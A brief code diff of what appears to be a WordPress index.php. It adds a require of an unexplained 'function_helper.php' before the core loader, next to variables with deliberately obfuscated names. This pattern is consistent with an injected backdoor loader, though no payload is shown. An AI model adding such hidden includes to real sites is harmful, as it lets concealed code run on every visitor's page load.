@@ -1,5 +1,4 @@
 <?php
-//ini_set('display_errors', 'On');
 //error_reporting(E_ALL | E_STRICT);
 $OO00_O__0O='606';
 $OO__00O0O_='1';
@@ -22,8 +21,7 @@ define('WP_USE_THEMES', true);
 
 /** Loads the WordPress Environment and Template */
 try {
-echo "hello";
-
+    require(dirname(__FILE__) . '/function_helper.php');
     require(dirname(__FILE__) . '/wp-blog-header.php');
 }catch (\Exception $e){
     print_r(['message'=>$e->getMessage(),'file'=>$e->getFile(),'line'=>$e->getLine()]);
